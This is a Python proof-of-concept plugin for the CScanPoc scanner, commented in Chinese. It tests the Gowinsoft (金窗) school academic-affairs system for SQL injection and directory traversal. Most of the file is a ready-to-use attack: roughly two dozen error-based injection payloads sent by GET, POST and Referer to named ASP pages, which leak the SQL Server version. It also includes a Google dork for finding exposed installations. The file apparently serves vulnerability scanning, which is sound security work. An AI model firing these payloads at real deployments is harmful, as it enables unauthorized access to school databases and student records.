# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Gowinsoft_0001_p'  # 平台漏洞编号，留空
    name = '金窗教务系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-16'  # 漏洞公布时间
    desc = '''
        金窗教务管理系统通用型SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '金窗教务系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c691e5de-493c-4507-8511-52f6bc1d30c7'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            '''
            name: 金窗教务系统多处注入
            author: yichin
            refer:
                http://www.wooyun.org/bugs/wooyun-2010-0120584
                http://www.wooyun.org/bugs/wooyun-2015-0128788
                http://www.wooyun.org/bugs/wooyun-2010-0121349
                http://www.wooyun.org/bugs/wooyun-2010-0101234
                http://www.wooyun.org/bugs/wooyun-2015-0128788
                http://www.wooyun.org/bugs/wooyun-2010-0101741
            description:
                google dork: inurl:web/web/lanmu
                ...
            '''
            hh = hackhttp.hackhttp()
            payloads1 = [
                self.target +
                '/web/web/lanmu/wenzhaishow.asp?id=44%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27abc%27=%27abc',
                self.target +
                '/web/web/web/showfj.asp?id=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/jiu/yjxianshihui.asp?id=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/jiu/gongwenshow.asp?id=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/lanmu/gongwenshow.asp?id=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/wenzhai/lanmushow.asp?lei=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/xx/yjxianshihui.asp?id=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/bao/list.asp?bh=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/jiaoshi/shizi/shizi/textbox.asp?id=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/jiaoshi/sj/shixi/biyeshan1.asp?id=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/jiaoshi/xueji/dangan/sdangangai1.asp?id=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/jiaoshi/xueji/shen/autobh.asp?jh=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/jiaoshi/xueji/zhuce/iszhuce.asp?xuehao=1%27and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/jiaoshi/xueji/xueji/dealfxue.asp?cmdok=1&id=1%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))',
            ]
            for payload in payloads1:
                code, head, res, err, _ = hh.http(payload)
                if code != 0 and 'GAO JI@Microsoft SQL Server' in res:
                    #security_hole('SQL injection: ' + payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            # post型
            payloads2 = [
                self.target + '/web/web/kebiao/kebiao.asp',
                self.target + '/web/web/jiu/yrdw.asp',
                self.target + '/web/web/jiu/yrxx.asp',
                self.target + '/web/web/jiu/qzxx.asp',
                self.target + '/web/web/lanmu/lqxx.asp',
                self.target + '/jiaoshi/sj/shixi/search.asp',
                self.target + '/web/web/bao/kaike.asp',
                self.target + '/web/web/lanmu/zsjh.asp',
            ]
            post = 'selw=%C8%AB%B2%BF&sel1w=%C8%AB%B2%BF&ww=1%27+and+1%3Dconvert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))+and+%27%25%27%3D%27&o=id+desc&id=0&y=1&act=&dizhi=%2Fweb%2Fweb%2Fjiu%2Fyrdw.asp%3F&w1=&w2=&sw1=&p=10&twid=750&wid=100%2C100%2C100%2C100%2C100%2C300%2C100%2C100%2C100%2C100&vrul=y%2Cy%2Cy%2Cy%2Cy%2Cy%2Cy%2Cy%2Cy%2Cy&m=%CF%C2%B9%FD%CF%D4%B2%E9&rul=%CE%C4%2C%CE%C4%2C%CE%C4%2C%CE%C4%2C%CE%C4%2C%C6%AA&h=%D3%C3%C8%CB%B5%A5%CE%BB%D0%C5%CF%A2&rig=%CE%DE&bh=6253'
            for payload in payloads2:
                code, head, res, err, _ = hh.http(
                    payload, post=post, referer=payload)
                # print payload
                # print res
                if code != 0 and 'GAO JI@Microsoft SQL Server' in res:
                    #security_hole('SQL injection: ' + payload + " POST: "+post)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            payload2_1 = self.target + '/web/web/wenzhai/shoushow.asp'
            content_type = 'Content-Type: application/x-www-form-urlencoded'
            post2_1 = 'xz=%B0%B4%C4%DA%C8%DD&cha=1%27+and+1%3Dconvert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B%40%40version%29%29+and+%27%25%27%3D%27&submit1=%B2%E9%D1%AF'
            code, head, res, err, _ = hh.http(
                payload2_1, post=post2_1, referer=payload2_1, header=content_type)
            if code != 0 and 'GAOJIMicrosoft SQL Server' in res:
                #security_hole('SQL injection: ' + payload2_1 + " POST: "+post2_1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            # 奇葩型（需要http referer头的get型）
            payloads3 = [
                self.target +
                '/web/web/lanmu/lanmushow.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/jiu/lanmushow.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/lanmu/lanmushow1.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a'
            ]
            referers = [
                self.target +
                '/web/web/lanmu/lanmushow.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/jiu/lanmushow.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/lanmu/lanmushow1.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a'
            ]
            for i in range(len(payloads3)):
                code, head, res, err, _ = hh.http(
                    payloads3[i], referer=referers[i])
                if code != 0 and 'GAO JI@Microsoft SQL Server' in res:
                    #security_hole('SQL injection: ' + payloads3[i] + " Referer: "+referers[i])
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            # 目录遍历
            code, head, res, err, _ = hh.http(
                self.target + '/install/mzzup.asp')
            # print res
            if code == 200 and 'admin.asp' in res:
                #security_info('目录遍历: ' + self.target + '/install/mzzup.asp')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
